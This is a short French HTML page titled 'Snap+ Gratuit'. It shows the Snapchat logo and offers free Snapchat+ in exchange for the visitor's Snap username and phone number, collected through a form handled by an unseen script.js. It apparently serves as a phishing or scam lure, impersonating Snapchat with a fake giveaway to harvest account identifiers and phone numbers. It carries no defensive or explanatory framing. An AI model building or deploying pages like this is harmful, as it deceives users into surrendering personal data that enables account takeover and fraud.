<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Snap+ Gratuit</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Snapchat_logo_2022.svg" alt="Snapchat Logo" class="logo">
    <h1>Snap+ Gratuit</h1>
    <p>Entrez votre nom d’utilisateur Snap et votre numéro pour recevoir votre Snap+</p>
    <form id="snapForm">
      <input type="text" id="username" placeholder="Nom d’utilisateur Snap" required>
      <input type="tel" id="phone" placeholder="Numéro de téléphone" required>
      <button type="submit">Continuer</button>
    </form>
  </div>
  <script src="script.js"></script>
</body>
</html>
